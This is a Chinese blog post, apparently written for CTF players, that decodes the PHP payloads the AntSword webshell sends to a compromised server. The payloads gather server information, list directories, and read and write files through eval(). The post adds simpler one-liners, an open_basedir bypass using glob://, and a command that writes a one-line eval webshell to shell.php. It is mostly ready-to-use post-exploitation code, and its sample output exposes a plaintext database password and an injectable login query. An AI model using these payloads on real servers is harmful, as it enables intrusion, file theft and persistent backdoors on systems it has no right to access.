---
title: php webshell 各种函数
date: 2016-05-12 20:04:02
tags:
- Blogs
- php
categories:
- Blogs
---

前段时间打ctf的时候突然发现，有时候我们getshell了，但是由于服务器大部分时候回禁用shell函数，我们往往只能使用eval(),一般意义来说，我们可以通过菜刀蚁剑这样的工具，但是如果我们的shell是通过文件包含的方式成立的，工具经常没法用，突然一下用php函数读文件写文件还需要查查看，所以今天分析下蚁剑的列目录读文件方式，需要的时候可以直接来用

<!--more-->
我是通过分析蚁剑的语句来列出的，毕竟菜刀不支持php7

## 查看当前目录&查看服务器信息
```
%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3B%40set_magic_quotes_runtime(0)%3Becho%20%22-%3D%3A%7B%22%3B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D)%3B%24R%3D%22%7B%24D%7D%09%22%3Bif(substr(%24D%2C0%2C1)!%3D%22%2F%22)%7Bforeach(range(%22A%22%2C%22Z%22)as%20%24L)if(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists(%22posix_getegid%22))%3F%40posix_getpwuid(%40posix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3Becho%20%22%7D%3A%3D-%22%3Bdie()%3B
```

整理下格式
```
@ini_set("display_errors", "0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo "-=:{";
$D=dirname($_SERVER["SCRIPT_FILENAME"]);
if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);
$R="{$D}	";
if(substr($D,0,1)!="/"){
	foreach(range("A","Z")as $L)
		if(is_dir("{$L}:"))
$R.="{$L}:";
}
else{
$R.="/";
}
$R.="	";
$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";
$s=($u)?$u["name"]:@get_current_user();
$R.=php_uname();
$R.="	{$s}";
echo $R;;
echo "}:=-";
die();
```

我们来看看返回
```
-=:{/home/wwwroot/default	/	Linux iZ285ei82c1Z 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64	www}:=-
```

## 列目录
```
@ini_set%28%22display_errors%22%2C%20%220%22%29%3B@set_time_limit%280%29%3B@set_magic_quotes_runtime%280%29%3Becho%20%22-%3D%3A%7B%22%3B%24D%3Dbase64_decode%28%24_POST%5B%220xbad31815%22%5D%29%3B%24F%3D@opendir%28%24D%29%3Bif%28%24F%3D%3DNULL%29%7Becho%28%22ERROR%3A%2f%2f%20Path%20Not%20Found%20Or%20No%20Permission%21%22%29%3B%7Delse%7B%24M%3DNULL%3B%24L%3DNULL%3Bwhile%28%24N%3D@readdir%28%24F%29%29%7B%24P%3D%24D.%22%2f%22.%24N%3B%24T%3D@date%28%22Y-m-d%20H%3Ai%3As%22%2C@filemtime%28%24P%29%29%3B@%24E%3Dsubstr%28base_convert%28@fileperms%28%24P%29%2C10%2C8%29%2C-4%29%3B%24R%3D%22%09%22.%24T.%22%09%22.@filesize%28%24P%29.%22%09%22.%24E.%22%0A%22%3Bif%28@is_dir%28%24P%29%29%24M.%3D%24N.%22%2f%22.%24R%3Belse%20%24L.%3D%24N.%24R%3B%7Decho%20%24M.%24L%3B@closedir%28%24F%29%3B%7D%3Becho%20%22%7D%3A%3D-%22%3Bdie%28%29%3B
```
修改下格式
```
@ini_set("display_errors", "0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo "-=:{";
$D=base64_decode($_POST["0xbad31815"]);
$F=@opendir($D);
if($F==NULL){
	echo("ERROR:// Path Not Found Or No Permission!");
}
else{
	$M=NULL;
	$L=NULL;
	while($N=@readdir($F)){
		$P=$D."/".$N;
		$T=@date("Y-m-d H:i:s",@filemtime($P));
		@$E=substr(base_convert(@fileperms($P),10,8),-4);
		$R="	".$T."	".@filesize($P)."	".$E."
		";
	if(@is_dir($P))
		$M.=$N."/".$R;
	else $L.=$N.$R;
	}
	echo $M.$L;
	@closedir($F);
};
echo "}:=-";
die();
```
看看返回什么
```
-=:{aaaj7/	2016-04-20 23:36:31	4096	0755
./	2016-05-12 19:59:42	4096	0755
aaaj5/	2016-04-11 20:19:09	4096	0755
aaaj6/	2016-03-20 20:50:35	4096	0755
xss/	2016-02-11 12:10:56	4096	0755
nweb1/	2016-04-05 12:40:34	4096	0755
aaaj1/	2016-04-11 19:15:06	4096	0755
web_aaa/	2015-10-27 13:18:09	4096	0755
aaa_final/	2015-12-21 14:25:49	4096	0755
aaaj3/	2016-04-11 19:20:56	4096	0755
aaaj.bak/	2016-03-15 13:47:09	4096	0755
mbWebTraffic/	2015-10-10 23:44:46	4096	0755
web1/	2015-12-20 16:04:36	4096	0755
web2/	2015-11-05 22:41:19	4096	0755
web3/	2015-11-05 22:46:17	4096	0755
aaaj2/	2016-03-14 14:25:00	4096	0755
sctfq1/	2016-04-11 15:22:00	4096	0755
CI/	2015-12-21 13:32:32	4096	0755
aaaj4/	2016-04-11 19:28:24	4096	0755
nweb/	2016-04-03 21:01:51	4096	0755
web50/	2015-12-01 15:51:02	4096	0775
websocket/	2016-03-27 15:19:00	4096	0755
xsstmp/	2016-01-27 22:26:40	4096	0755
table/	2015-11-18 19:31:05	4096	0755
9d8cb6817c34555064ffc486e5a53d8e.jpg	2015-11-07 13:29:39	114461	0644
}:=-
```
看得出来做的很清晰

里面还有个字段`$_POST["0xbad31815"]=L2hvbWUvd3d3cm9vdC9kZWZhdWx0Lw==`，后面就是列的目录

## 读文件
```
a=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3B%40set_magic_quotes_runtime(0)%3Becho%20%22-%3D%3A%7B%22%3B%24F%3Dbase64_decode(%24_POST%5B%220xbad31815%22%5D)%3B%24P%3D%40fopen(%24F%2C%22r%22)%3Becho(%40fread(%24P%2Cfilesize(%24F)))%3B%40fclose(%24P)%3B%3Becho%20%22%7D%3A%3D-%22%3Bdie()%3B{
```
```
a=@ini_set("display_errors", "0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo "-=:{";
$F=base64_decode($_POST["0xbad31815"]);
$P=@fopen($F,"r");
echo(@fread($P,filesize($F)));
@fclose($P);;
echo "}:=-";
die();
{
```
返回
```
-=:{<?php
	$user=trim($_POST['user']);
	$pass=md5(trim($_POST['pass']));
	$userid=$_COOKIE['userid'];

	 $db = new mysqli('localhost','xx','sGya3fFLx8zPXe','xx1');

	$query="select password from users where username = '".$user."' and password = '".$password."'";
	$result=$db->query($query);
	$result_num=$result->num_rows;
	if($result_num==0)
	{
		echo "<script>alert('Something Error!')</script>";
		echo "<script>window.location.href='./welcome.php'</script>";	
	}

	else
	{
		$row=$result->fetch_assoc();
		$password=$row['password'];
		if($pass=$password)
		{
			$query = "update users set lastcookie = '".$userid."' where username = '".$user."'";
			$result = $db->query($query);
			header("location:./user.php");
		}
		else
		{
			echo "<script>alert('Something Error!')</script>";
                        echo "<script>window.location.href='./welcome.php'</script>";
		}

	}
	
?>
}:=-
```
当然读的文件地址是`$_POST["0xbad31815"] = L2hvbWUvd3d3cm9vdC9kZWZhdWx0L2hjdGZqMS9sb2dpbi5waHA=`

## 写文件

```
a=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3B%40set_magic_quotes_runtime(0)%3Becho%20%22-%3D%3A%7B%22%3Becho%20%40fwrite(fopen(base64_decode(%24_POST%5B%220xbad31815%22%5D)%2C%22w%22)%2Cbase64_decode(%24_POST%5B%220xa7418ec4%22%5D))%3F%221%22%3A%220%22%3B%3Becho%20%22%7D%3A%3D-%22%3Bdie()%3B
```
```
a=@ini_set("display_errors", "0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo "-=:{";
echo @fwrite(fopen(base64_decode($_POST["0xbad31815"]),"w"),base64_decode($_POST["0xa7418ec4"]))?"1":"0";;
echo "}:=-";
die();
```
写的文件地址还是`$_POST["0xbad31815"] = L2hvbWUvd3d3cm9vdC9kZWZhdWx0L2hjdGZqMS9sb2dpbi5waHA=`

写的文件内容
```
$_POST["0xa7418ec4"] = PD9waHANCgkkdXNlcj10cmltKCRfUE9TVFsndXNlciddKTsNCgkkcGFzcz1tZDUodHJpbSgkX1BPU1RbJ3Bhc3MnXSkpOw0KCSR1c2VyaWQ9JF9DT09LSUVbJ3VzZXJpZCddOw0KDQoJICRkYiA9IG5ldyBteXNxbGkoJ2xvY2FsaG9zdCcsJ3dlYjExMScsJ3NHeWEzZkZMajV1OHpQWGUnLCdoY3Rmd2ViMScpOw0KDQoJJHF1ZXJ5PSJzZWxlY3QgcGFzc3dvcmQgZnJvbSB1c2VycyB3aGVyZSB1c2VybmFtZSA9ICciLiR1c2VyLiInIGFuZCBwYXNzd29yZCA9ICciLiRwYXNzd29yZC4iJyI7DQoJJHJlc3VsdD0kZGItPnF1ZXJ5KCRxdWVyeSk7DQoJJHJlc3VsdF9udW09JHJlc3VsdC0+bnVtX3Jvd3M7DQoJaWYoJHJlc3VsdF9udW09PTApDQoJew0KCQllY2hvICI8c2NyaXB0PmFsZXJ0KCdTb21ldGhpbmcgRXJyb3IhJyk8L3NjcmlwdD4iOw0KCQllY2hvICI8c2NyaXB0PndpbmRvdy5sb2NhdGlvbi5ocmVmPScuL3dlbGNvbWUucGhwJzwvc2NyaXB0PiI7CQ0KCX0NCg0KCWVsc2UNCgl7DQoJCSRyb3c9JHJlc3VsdC0+ZmV0Y2hfYXNzb2MoKTsNCgkJJHBhc3N3b3JkPSRyb3dbJ3Bhc3N3b3JkJ107DQoJCWlmKCRwYXNzPSRwYXNzd29yZCkNCgkJew0KCQkJJHF1ZXJ5ID0gInVwZGF0ZSB1c2VycyBzZXQgbGFzdGNvb2tpZSA9ICciLiR1c2VyaWQuIicgd2hlcmUgdXNlcm5hbWUgPSAnIi4kdXNlci4iJyI7DQoJCQkkcmVzdWx0ID0gJGRiLT5xdWVyeSgkcXVlcnkpOw0KCQkJaGVhZGVyKCJsb2NhdGlvbjouL3VzZXIucGhwIik7DQoJCX0NCgkJZWxzZQ0KCQl7DQoJCQllY2hvICI8c2NyaXB0PmFsZXJ0KCdTb21ldGhpbmcgRXJyb3IhJyk8L3NjcmlwdD4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPHNjcmlwdD53aW5kb3cubG9jYXRpb24uaHJlZj0nLi93ZWxjb21lLnBocCc8L3NjcmlwdD4iOw0KCQl9DQoNCgl9DQoJDQo/Pg0K
```

# 简单的方式
除了蚁剑的针对大型的服务器外，其实没必要那么复杂就可以获取我们想要的信息了

## 列目录
```
a=echo "<br />";$handler = opendir('./');while( ($filename = readdir($handler)) !== false ) {echo $filename."<br/>";}
```
由于可能有open_basedir的问题，所以需要绕过
[http://drops.wooyun.org/tips/3978](http://drops.wooyun.org/tips/3978)
```
<?php  
printf('<b>open_basedir : %s </b><br />', ini_get('open_basedir'));  
$file_list = array();
// normal files
$it = new DirectoryIterator("glob:///home/wwwroot/*");
foreach($it as $f) {  
    $file_list[] = $f->__toString();
}
// special files (starting with a dot(.))
$it = new DirectoryIterator("glob:///home/wwwroot/.*");
foreach($it as $f) {  
    $file_list[] = $f->__toString();
}
sort($file_list);  
foreach($file_list as $f){  
        echo "{$f}<br/>";
}
?>
```
## 读文件
```
a=$username=file_get_contents('./4ff692fb12aa996e27f0a108bfc386c2');var_dump($username);
```
## 写文件
```
file_put_contents("/home/wwwroot/hackme/05d6a8025a7d0c0eee5f6d12a0a94cc9/shell.php",'<?php eval($_POST[1]);?>');  
```